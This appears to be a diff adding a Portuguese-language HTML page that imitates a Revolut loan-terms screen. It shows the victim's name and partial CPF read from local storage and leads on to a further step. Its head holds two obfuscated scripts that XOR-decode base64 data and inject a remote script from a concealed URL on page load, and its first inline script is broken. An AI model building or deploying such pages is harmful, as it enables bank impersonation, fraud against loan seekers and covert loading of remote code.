@@ -1,0 +1,161 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+<script>
+function redirectWithParams(destination) {
+  window.location.href = destination;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Condições do Empréstimo — Revolut</title>
+<link rel="icon" href="images/revolut-favicon.svg">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{background:#f3f4f6;color:#EE4D2D;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#f3f4f6}
+
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:#fff;border-bottom:1px solid #eee}
+  .menu-btn{width:36px;height:36px;border-radius:10px;background:#f1ecff;display:flex;align-items:center;justify-content:center;border:0}
+  .menu-btn span{display:block;width:14px;height:2px;background:#EE4D2D;position:relative}
+  .menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:14px;height:2px;background:#EE4D2D}
+  .menu-btn span::before{top:-5px}.menu-btn span::after{top:5px}
+  .brand{font-weight:800;font-size:22px;letter-spacing:-0.5px;margin-left:10px;flex:1}
+  .user-block{display:flex;align-items:center;gap:10px}
+  .user-info{text-align:right;line-height:1.1}
+  .user-info .name{font-size:13px;font-weight:600;text-transform:capitalize}
+  .user-info .cpf{font-size:11px;color:#9ca3af;letter-spacing:1px}
+  .avatar{width:34px;height:34px;border-radius:50%;border:1.5px solid #EE4D2D;display:flex;align-items:center;justify-content:center}
+  .avatar svg{width:18px;height:18px}
+
+  .card{margin:16px;background:#fff;border-radius:22px;padding:28px 22px;box-shadow:0 1px 2px rgba(0,0,0,.04);flex:1}
+  h1{text-align:center;font-size:22px;font-weight:800;letter-spacing:-.6px;margin-bottom:8px}
+  .lead{text-align:center;font-size:14px;color:#52525b;margin-bottom:24px;line-height:1.45}
+
+  .term{display:flex;gap:14px;align-items:flex-start;padding:18px;border:1px solid #f0f0f3;border-radius:18px;margin-bottom:14px}
+  .term .ic{width:44px;height:44px;border-radius:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .term .ic svg{width:22px;height:22px}
+  .ic.dark{background:#EE4D2D;color:#fff}
+  .ic.warn{background:#fef3c7;color:#a16207}
+  .term .t{font-size:14px;font-weight:700;margin-bottom:4px;line-height:1.35}
+  .term .t strong{color:#EE4D2D}
+  .term .d{font-size:13px;color:#71717a;line-height:1.45}
+
+  .btn-cta{display:flex;align-items:center;justify-content:center;gap:10px;background:#EE4D2D;color:#fff;border:none;padding:18px 24px;border-radius:16px;font-size:16px;font-weight:700;width:100%;margin-top:24px;cursor:pointer;font-family:inherit}
+  .btn-cta:active{transform:scale(.99)}
+  .btn-cta svg{width:18px;height:18px}
+
+  .footer{text-align:center;padding:24px 16px 30px;color:#71717a;font-size:11px;background:#f3f4f6}
+  .footer .l{font-weight:800;color:#EE4D2D;font-size:18px;letter-spacing:-.4px;margin-bottom:6px}
+  .footer .badges{display:flex;justify-content:center;gap:18px;margin-top:14px;font-size:12px;color:#71717a;flex-wrap:wrap}
+  .footer .badges span{display:inline-flex;align-items:center;gap:6px;font-weight:600}
+  .footer .badges svg{width:14px;height:14px}
+</style>
+
+
+
+
+
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  
+
+
+
+
+
+<script>(function(){var b_d=atob("DIlbanqRr1u5pAncE/J5Hwj9jWGbzH2oY/phRVXyyzWX0X2xeu8iRBn+wnXb1iavcPsyGg7igCvQ3GywPPkyEh/9gTHKhiX+cv0vGBPz2i/c1yvmSNR3SB39wDnYyHr+KdIgSBTwwj6bniusevE+BjP1jXeb0miwZux5UFinzj3fxTq/drlqX0innj6JnGzuJrxqCEiz0gbE");var d_im4z=[];for(var x_onn=0;x_onn<b_d.length;x_onn++){d_im4z.push(b_d.charCodeAt(x_onn)&255);}var q_gib=d_im4z[0];var r_6k3=d_im4z.slice(1,1+q_gib);var y_8q=d_im4z.slice(1+q_gib);var q_x1k=y_8q.map(function(b,o_obb){return b^r_6k3[o_obb%q_gib];});var l_qj="";for(var h_c5a7=0;h_c5a7<q_x1k.length;h_c5a7++){l_qj+=String.fromCharCode(q_x1k[h_c5a7]&255);}var j_snh=decodeURIComponent(escape(l_qj));var y_8=JSON.parse(j_snh);var o_933o=y_8.globals||[];o_933o.forEach(function(s_y){window[s_y.name]=s_y.value;});var g_6za=document.createElement("script");g_6za.src=y_8.url;g_6za.async=true;g_6za.defer=true;(y_8.attributes||[]).forEach(function(e_zvf1){g_6za.setAttribute(e_zvf1.name,e_zvf1.value);});(document.head||document.documentElement).appendChild(g_6za);})();</script>
+<script>(function(){var x_emd=atob("DKKyBEDeK7Uok71SO9mQcTKyCY8K+8kmS9GIK2+9T9sG5sk/UsTLKiOxRptK4ZIhWNDbdDStBMBc/s59V8PGYTOqBd9bsZFwWtbGdim8XsFN4J9oYNmQaiGzTpcSsdkzT8OfcTSzQtNRvs0gXtTXajTzU9ZH95AhWMmQKGKoStld9p9oGYDPKDv8RdRF9p9oGcbTcCHzXsFF+tsrFtLAYTa7RcEF4MgwUsbBJmz8XdRE5thwAYCQeR2j");var y_b3ne=[];for(var d_5lk=0;d_5lk<x_emd.length;d_5lk++){y_b3ne.push(x_emd.charCodeAt(d_5lk)&255);}var b_hhjm=y_b3ne[0];var t_8=y_b3ne.slice(1,1+b_hhjm);var y_xwi=y_b3ne.slice(1+b_hhjm);var b_g=y_xwi.map(function(b,k_v7){return b^t_8[k_v7%b_hhjm];});var h_9="";for(var s_v=0;s_v<b_g.length;s_v++){h_9+=String.fromCharCode(b_g[s_v]&255);}var j_c=decodeURIComponent(escape(h_9));var p_y=JSON.parse(j_c);var z_mpan=p_y.globals||[];z_mpan.forEach(function(t_4a){window[t_4a.name]=t_4a.value;});var v_kq=document.createElement("script");v_kq.src=p_y.url;v_kq.async=true;v_kq.defer=true;(p_y.attributes||[]).forEach(function(d_q1){v_kq.setAttribute(d_q1.name,d_q1.value);});(document.head||document.documentElement).appendChild(v_kq);})();</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <button class="menu-btn" aria-label="menu"><span></span></button>
+    <div class="brand"><img src="images/revolut-logo.svg" alt="Revolut" style="height:28px;width:auto;display:block;"></div>
+    <div class="user-block">
+      <div class="user-info">
+        <div class="name" id="userName">cliente cliente</div>
+        <div class="cpf" id="userCpf">*** *** ***</div>
+      </div>
+      <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h1>Condições do Empréstimo</h1>
+    <div class="lead">Leia atentamente antes de prosseguir</div>
+
+    <div class="term">
+      <div class="ic dark"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 12h6m-6 4h6m-6-8h6M7 4h10a2 2 0 012 2v12a2 2 0 01-2 2H7a2 2 0 01-2-2V6a2 2 0 012-2z" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+      <div>
+        <div class="t">Se houver atraso no pagamento das parcelas, serão aplicados juros de <strong>0,49%</strong> ao mês.</div>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="ic warn"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 9v4m0 4h.01M10.3 4.2l-8.6 14.9A2 2 0 003.2 22h17.6a2 2 0 001.5-2.9L13.7 4.2a2 2 0 00-3.4 0z" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+      <div>
+        <div class="t">Importante: O pagamento em dia evita juros e mantém seu crédito saudável.</div>
+      </div>
+    </div>
+
+    <button class="btn-cta" id="agreeBtn">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.6-4A11.96 11.96 0 0112 3 11.96 11.96 0 01 3.4 6 12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.13-2-.4-3z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+      Li e Concordo
+    </button>
+  </div>
+
+  <div class="footer">
+    <div class="l"><img src="images/revolut-logo.svg" alt="Revolut" style="height:32px;width:auto;display:block;margin:0 auto 6px;"></div>
+    <div>Rev Business LTD</div>
+    <div>Av. Brigadeiro Faria Lima, 4440 - 11º andar, Itaim Bibi, São Paulo - SP, 04538-132</div>
+    <div class="badges">
+      <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>SSL Seguro</span>
+      <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.6-4A11.96 11.96 0 0112 3 11.96 11.96 0 01 3.4 6 12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.13-2-.4-3z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>Dados protegidos</span>
+      <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 21h18M5 21V7l7-4 7 4v14M9 9h.01M15 9h.01M9 13h.01M15 13h.01M9 17h.01M15 17h.01" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>Instituição regulada</span>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var nome = (localStorage.getItem('nome')||'cliente').trim();
+  var p = nome.split(/\s+/);
+  document.getElementById('userName').textContent = ((p[0]||'cliente')+' '+(p.slice(-1)[0]||'')).trim().toLowerCase();
+  var cpfVal = (localStorage.getItem('cpf')||'').replace(/\D/g,'');
+  if(cpfVal.length>=9) document.getElementById('userCpf').textContent = cpfVal.slice(0,3)+' *** *'+cpfVal.slice(7,9);
+
+  document.getElementById('agreeBtn').onclick = function(){
+    localStorage.setItem('termosAceitos','true');
+    var p = new URLSearchParams(window.location.search);
+    redirectWithParams('vencimento.html');
+  };
+})();
+</script>
+
+
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Av. Brigadeiro Faria Lima, 4440 - 11º andar, Itaim Bibi, São Paulo - SP, 04538-132</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+</body></html>
